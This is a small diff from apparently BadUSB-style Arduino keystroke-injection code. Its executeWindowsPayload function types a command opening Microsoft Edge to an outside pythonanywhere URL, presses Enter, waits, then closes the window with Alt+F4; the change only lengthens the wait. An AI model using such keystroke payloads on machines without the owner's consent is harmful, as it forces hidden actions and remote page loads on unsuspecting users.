@@ -211,7 +211,7 @@ void executeWindowsPayload() {
     Keyboard.print("start microsoft-edge:https://protohype.pythonanywhere.com/");
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
-    delay(2500);
+    delay(5500);
     // Close the active browser window
     Keyboard.press(KEY_LEFT_ALT);
     Keyboard.press(KEY_F4);
